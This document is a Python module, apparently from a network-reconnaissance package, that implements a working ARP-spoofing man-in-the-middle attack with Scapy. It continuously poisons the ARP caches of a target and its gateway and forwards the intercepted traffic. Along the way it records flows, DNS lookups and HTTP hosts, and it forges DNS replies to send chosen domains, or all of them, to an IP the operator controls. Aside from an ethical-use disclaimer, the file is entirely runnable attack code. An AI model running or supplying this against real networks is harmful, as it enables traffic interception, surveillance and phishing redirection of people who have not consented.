"""ARP-spoof MITM with packet forwarding and live traffic analysis (Scapy + Npcap).

Poisons the target<->gateway ARP mapping so the target's traffic flows through
this host, **forwards** it in userspace (so the target keeps connectivity), and
extracts flows / DNS queries / HTTP Host headers as it passes. Restores the ARP
tables on stop.

Optionally performs **DNS spoofing** (bettercap-style): forged DNS replies that
redirect chosen domains to an IP you control — the classic captive-portal /
phishing-test primitive for authorized red-team engagements.

Requires Administrator (raw L2 send) and Npcap. Windows-focused.

  ⚠ ETHICAL USE ONLY. ARP spoofing and DNS spoofing are active attacks. Only run
  against devices on a network you own or are explicitly authorized to test.
  Unauthorized interception or redirection of traffic is illegal in most
  jurisdictions. netrecon is for defensive security and authorized assessment.
"""

from __future__ import annotations

import threading
from typing import Callable, Optional


def _scapy():
    import scapy.all as s  # imported lazily so the package works without scapy
    return s


def http_host(raw: bytes) -> Optional[str]:
    """Extract the Host header from a raw HTTP request (pure; unit-tested)."""
    try:
        for line in raw.decode("latin-1", "replace").split("\r\n"):
            if line.lower().startswith("host:"):
                return line.split(":", 1)[1].strip() or None
    except Exception:
        pass
    return None


def spoof_match(qname: str, spoof: dict) -> Optional[str]:
    """Return the redirect IP for a DNS name if it matches a configured pattern.

    Pure and unit-tested. Patterns (case-insensitive):
      - exact domain        'example.com'
      - suffix wildcard     '*.example.com'  (matches the base + any subdomain)
      - catch-all           '*'              (matches everything)
    """
    if not qname or not spoof:
        return None
    q = qname.lower().rstrip(".")
    if "*" in spoof:
        return spoof["*"]
    for pat, ip in spoof.items():
        p = str(pat).lower().rstrip(".")
        if p.startswith("*."):
            base = p[2:]
            if q == base or q.endswith("." + base):
                return ip
        elif q == p:
            return ip
    return None


def scapy_iface_for(ip: Optional[str]):
    """Resolve the Scapy interface object whose IPv4 matches `ip` (else None →
    Scapy's default, which may be a VPN/virtual adapter — so pass a real IP)."""
    if not ip:
        return None
    s = _scapy()
    try:
        for iface in s.conf.ifaces.values():
            if getattr(iface, "ip", None) == ip:
                return iface
    except Exception:
        pass
    return None


def get_mac(ip: str, iface=None) -> Optional[str]:
    s = _scapy()
    ans, _ = s.srp(
        s.Ether(dst="ff:ff:ff:ff:ff:ff") / s.ARP(pdst=ip),
        timeout=2, retry=2, verbose=0, iface=iface,
    )
    for _, r in ans:
        return r[s.ARP].hwsrc
    return None


class MitmSession:
    """Controllable ARP-spoof MITM session with forwarding + analysis callbacks."""

    def __init__(self, target_ip: str, gateway_ip: str, iface_ip=None,
                 on_flow: Optional[Callable] = None, on_dns: Optional[Callable] = None,
                 on_http: Optional[Callable] = None, dns_spoof: Optional[dict] = None,
                 on_spoof: Optional[Callable] = None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface_ip = iface_ip     # bind to the adapter with this IPv4
        self.iface = None            # resolved Scapy interface at start()
        self.on_flow = on_flow
        self.on_dns = on_dns
        self.on_http = on_http
        # DNS spoofing (authorized testing only): {domain-pattern: redirect-ip}
        self.dns_spoof = dict(dns_spoof or {})
        self.on_spoof = on_spoof
        self.target_mac: Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.our_mac: Optional[str] = None
        self.stats = {"packets": 0, "forwarded": 0, "dns": 0, "spoofed": 0}
        self._stop = threading.Event()
        self._threads = []

    def start(self) -> None:
        s = _scapy()
        self.iface = scapy_iface_for(self.iface_ip)  # bind to the chosen adapter
        self.our_mac = s.get_if_hwaddr(self.iface) if self.iface else s.get_if_hwaddr(s.conf.iface)
        self.target_mac = get_mac(self.target_ip, self.iface)
        self.gateway_mac = get_mac(self.gateway_ip, self.iface)
        if not self.target_mac or not self.gateway_mac:
            raise RuntimeError(
                f"could not resolve MACs (target={self.target_mac}, gateway={self.gateway_mac}); "
                "is the target online and on this subnet?"
            )
        self._threads = [
            threading.Thread(target=self._poison_loop, daemon=True),
            threading.Thread(target=self._sniff_loop, daemon=True),
        ]
        for t in self._threads:
            t.start()

    def _poison_loop(self) -> None:
        s = _scapy()
        while not self._stop.is_set():
            # tell the target that WE are the gateway, and the gateway that we are the target
            s.sendp(s.Ether(dst=self.target_mac) / s.ARP(
                op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip),
                iface=self.iface, verbose=0)
            s.sendp(s.Ether(dst=self.gateway_mac) / s.ARP(
                op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip),
                iface=self.iface, verbose=0)
            self._stop.wait(2)

    def _sniff_loop(self) -> None:
        s = _scapy()
        s.sniff(iface=self.iface, store=0, prn=self._handle,
                stop_filter=lambda _p: self._stop.is_set())

    def _handle(self, pkt) -> None:
        s = _scapy()
        if not pkt.haslayer(s.IP) or not pkt.haslayer(s.Ether):
            return
        if pkt[s.Ether].dst != self.our_mac:  # only frames redirected to us by the poisoning
            return
        ip = pkt[s.IP]
        if ip.src == self.target_ip:
            fwd_mac = self.gateway_mac
        elif ip.dst == self.target_ip:
            fwd_mac = self.target_mac
        else:
            return

        self.stats["packets"] += 1
        proto = "tcp" if pkt.haslayer(s.TCP) else "udp" if pkt.haslayer(s.UDP) else str(ip.proto)
        dport = (pkt[s.TCP].dport if pkt.haslayer(s.TCP)
                 else pkt[s.UDP].dport if pkt.haslayer(s.UDP) else 0)
        if self.on_flow:
            self.on_flow(ip.src, ip.dst, proto, dport, len(pkt))
        if pkt.haslayer(s.DNSQR):
            try:
                qn = pkt[s.DNSQR].qname.decode("latin-1").rstrip(".")
            except Exception:
                qn = None
            if qn:
                self.stats["dns"] += 1
                if self.on_dns:
                    self.on_dns(ip.src, qn)
                # DNS spoofing: forge a reply for matching domains from the target,
                # then DROP the real query so our answer wins. Authorized testing only.
                if (self.dns_spoof and ip.src == self.target_ip
                        and pkt.haslayer(s.UDP) and pkt[s.UDP].dport == 53):
                    spoof_ip = spoof_match(qn, self.dns_spoof)
                    if spoof_ip:
                        self._send_spoofed_dns(pkt, qn, spoof_ip)
                        return
        if dport == 80 and pkt.haslayer(s.Raw):
            host = http_host(bytes(pkt[s.Raw].load))
            if host and self.on_http:
                self.on_http(ip.src, host)

        pkt[s.Ether].dst = fwd_mac  # forward to the real next hop
        try:
            s.sendp(pkt, iface=self.iface, verbose=0)
            self.stats["forwarded"] += 1
        except Exception:
            pass

    def _send_spoofed_dns(self, pkt, qname: str, spoof_ip: str) -> None:
        """Forge and send a DNS A-record reply redirecting `qname` to `spoof_ip`."""
        s = _scapy()
        ip = pkt[s.IP]
        udp = pkt[s.UDP]
        dns = pkt[s.DNS]
        resp = (s.Ether(src=self.our_mac, dst=self.target_mac)
                / s.IP(src=ip.dst, dst=ip.src)
                / s.UDP(sport=udp.dport, dport=udp.sport)
                / s.DNS(id=dns.id, qr=1, aa=1, ra=1, qd=dns.qd,
                        an=s.DNSRR(rrname=pkt[s.DNSQR].qname, type="A", ttl=120, rdata=spoof_ip)))
        try:
            s.sendp(resp, iface=self.iface, verbose=0)
            self.stats["spoofed"] += 1
            if self.on_spoof:
                self.on_spoof(ip.src, qname, spoof_ip)
        except Exception:
            pass

    def stop(self) -> None:
        self._stop.set()
        if not (self.target_mac and self.gateway_mac):
            return
        s = _scapy()
        try:  # heal the ARP tables so the target keeps working
            for _ in range(4):
                s.sendp(s.Ether(dst=self.target_mac) / s.ARP(
                    op=2, pdst=self.target_ip, hwdst=self.target_mac,
                    psrc=self.gateway_ip, hwsrc=self.gateway_mac), iface=self.iface, verbose=0)
                s.sendp(s.Ether(dst=self.gateway_mac) / s.ARP(
                    op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                    psrc=self.target_ip, hwsrc=self.target_mac), iface=self.iface, verbose=0)
        except Exception:
            pass
